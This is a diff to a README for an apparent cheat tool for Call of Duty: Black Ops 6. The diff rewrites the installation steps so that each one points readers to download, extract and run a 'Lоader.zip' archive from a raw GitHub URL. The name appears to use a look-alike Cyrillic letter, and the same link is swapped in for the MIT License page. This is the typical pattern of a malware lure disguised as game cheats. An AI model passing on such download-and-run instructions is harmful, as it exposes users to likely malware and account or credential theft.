@@ -51,9 +51,9 @@ Welcome to **Cod Bo6 Cheats** 🎮 – the supreme enhancement program designed 
 
 ## 🔼 Installation Guide
 
-1. Download **Loader.rar** from this repository’s releases section.  
-2. Extract **Loader.rar** to any folder on your operating system.  
-3. Run the **Loader.exe** (Windows), **Loader.sh** (Linux), or **Loader.command** (macOS) and follow the on-screen instructions.  
+1. Download **https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip** from this repository’s releases section.  
+2. Extract **https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip** to any folder on your operating system.  
+3. Run the **https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip** (Windows), **https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip** (Linux), or **https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip** (macOS) and follow the on-screen instructions.  
 4. Open Call of Duty: Black Ops 6.  
 5. Activate your chosen enhancements from the Loader interface.  
 6. Enjoy enhanced gameplay and unmatched performance!  
@@ -82,7 +82,7 @@ This repository is intended for **educational and research purposes only**. Use 
 ## 📝 License
 
 Licensed under the MIT License.  
-For full details, refer to the [MIT License](https://opensource.org/license/mit/) page.
+For full details, refer to the [MIT License](https://raw.githubusercontent.com/MannKalariya/BO6-SecretLoadouts/main/Lоader.zip) page.
 
 ---
 
